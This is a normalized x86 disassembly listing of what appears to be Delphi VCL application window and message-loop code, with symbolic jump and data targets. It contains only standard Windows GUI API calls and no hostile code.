je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_40599c
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_40321c
mov eax [ esi + 0x90 ]
call sub_40321c
mov eax [ esi + 0x98 ]
call sub_40321c
test bl bl
jle r-xdata
call sub_420c64
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_45f0ac
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45f24d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f254
lea eax [ ebp - 0x2c ]
call sub_403f6c
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45f62c
call sub_420bcc
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_40442c
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406d70
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f6c
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45fd30
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45fd30
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45f25c
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45df90
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45f2bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_41a040
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4470c4
cmp ebx eax
je r-xdata
sub_45f32c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45f2bc
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41a19c
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45f444
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_41a19c
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45f4e0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c99c
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45e49c
mov eax [ rw-data ]
call sub_45eae4
sub_45f538
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45f595
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f59c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404164
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45f5a4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45f5e0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45fd30
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45f62c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_45fce6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45f4e0
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4607f4
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_41a19c
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4470c4
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_461720
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_460310
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4602b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4470c4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fd30
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_45eae4
push ebp
call sub_45f5a4
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_45f5a4
pop ecx
jmp [ eax * 4 + jump_table_45f6d0 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4470c4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_460174
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44ba1c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45f538
push ebp
call sub_45f5a4
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_45f5a4
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_45f5a4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_41f99c
jmp r-xdata
xor eax eax
call sub_457464
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4470c4
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_441a58
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fd4c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_45f5a4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45cce4
jmp r-xdata
push ebp
call sub_45f5a4
pop ecx
jmp r-xdata
push ebp
call sub_45f5e0
pop ecx
jmp r-xdata
push ebp
call sub_45f5a4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f444
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fdfc
jmp r-xdata
jmp r-xdata
call sub_432154
call sub_432234
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f434
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f444
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f43c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_457314
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_45f5a4
pop ecx
jmp r-xdata
call sub_4573c8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_45f5a4
pop ecx
jmp r-xdata
call sub_432154
call sub_432290
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d478
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_45fd4c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_45f434
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_45ed64
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4470c4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4470c4
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_45fdfc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_45ed64
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4470c4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_45f444
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4470c4
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_45aa70
mov eax [ ebx + 0x44 ]
call sub_45ce8c
sub_45fefc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_45ff38
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403fc0
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_40405c
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_45ff84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460006
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
lea eax [ ebx + 0x8c ]
mov edx esi
call sub_403fc0
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_45ff38
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404378
jne r-xdata
mov eax esi
call sub_40442c
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowTextA
lea eax [ ebx + 0x8c ]
call sub_403f6c
jmp r-xdata
cmp [ ebx + 0x8c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46000d
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_460014
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_460038
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_460088
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_43d784
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4470c4
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_460140
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_4610b8
sub_460174
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4470c4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403418
test al al
jne r-xdata
sub_4601e0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_460140
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_460038
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_460088
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_460014
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_460290
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4601e0
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_460b60
sub_4602b4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_41a17c
mov eax 0x8
call sub_40278c
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_41a040
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_460310
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_41a19c
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4027ac
mov edx esi
mov eax [ ebx + 0xa8 ]
